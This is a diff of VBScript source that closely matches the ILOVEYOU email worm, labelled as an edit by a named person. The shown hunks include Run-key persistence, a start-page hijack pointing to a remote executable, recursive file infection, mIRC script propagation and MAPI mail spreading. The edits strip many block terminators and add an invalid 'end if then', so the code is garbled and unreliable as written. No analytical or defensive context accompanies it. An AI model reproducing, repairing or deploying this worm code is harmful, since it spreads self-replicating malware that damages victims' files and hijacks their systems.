@@ -27,7 +27,6 @@ rem by: Edited By Mani sai Prasad
  html() 
  spreadtoemail() 
  listadriv() 
- end sub 
  sub regruns() 
  On Error Resume Next 
  Dim num,downread 
@@ -39,7 +38,7 @@ rem by: Edited By Mani sai Prasad
  downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory") 
  if (downread="") then 
  downread="c:\" 
- end if 
+ end if then
  if (fileexist(dirsystem&"\WinFAT32.exe")=1) then 
  Randomize 
  num = Int((4 * Rnd) + 1) 
@@ -58,14 +57,10 @@ rem by: Edited By Mani sai Prasad
  regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start 
  Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSD 
  GjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN -BUGSFIX.exe" 
- end if 
- end if 
  if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then regcreate 
  "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BU GSFIX",downread&"\WIN-BUGSFIX.exe" 
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet 
  Explorer\Main\Start Page","about:blank" 
- end if 
- end sub 
  sub listadriv 
  On Error Resume Next 
  Dim d,dc,s 
@@ -73,7 +68,6 @@ rem by: Edited By Mani sai Prasad
  For Each d in dc 
  If d.DriveType = 2 or d.DriveType=3 Then 
  folderlist(d.path&"\") 
- end if 
  Next 
  listadriv = s 
  end sub 
@@ -110,7 +104,6 @@ rem by: Edited By Mani sai Prasad
  mp3.close 
  set att=fso.GetFile(f1.path) 
  att.attributes=att.attributes+2 
- end if 
  if (eq<>folderspec) then 
  if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then 
  set scriptini=fso.CreateTextFile(folderspec&"\script.ini") scriptini.WriteLine "[script]" 
@@ -127,10 +120,7 @@ rem by: Edited By Mani sai Prasad
  scriptini.WriteLine "n3=}" 
  scriptini.close 
  eq=folderspec 
- end if 
- end if 
- next 
- end sub 
+ end sub
  sub folderlist(folderspec) 
  On Error Resume Next 
  dim f,f1,sf 
@@ -140,11 +130,9 @@ rem by: Edited By Mani sai Prasad
  infectfiles(f1.path) 
  folderlist(f1.path) 
  next 
- end sub 
  sub regcreate(regkey,regvalue) 
  Set regedit = CreateObject("WScript.Shell") 
  regedit.RegWrite regkey,regvalue 
- end sub 
  function regget(value) 
  Set regedit = CreateObject("WScript.Shell") 
  regget=regedit.RegRead(value) 
@@ -156,7 +144,6 @@ rem by: Edited By Mani sai Prasad
  msg = 0 
  else 
  msg = 1 
- end if 
  fileexist = msg 
  end function 
  function folderexist(folderspec) 
@@ -166,7 +153,6 @@ rem by: Edited By Mani sai Prasad
  msg = 0 
  else 
  msg = 1 
- end if 
  fileexist = msg 
  end function 
  sub spreadtoemail() 
@@ -203,7 +189,7 @@ rem by: Edited By Mani sai Prasad
  next 
  Set out=Nothing 
  Set mapi=Nothing 
- end sub 
+ end sub
  sub html 
  On Error Resume Next 
  dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6 
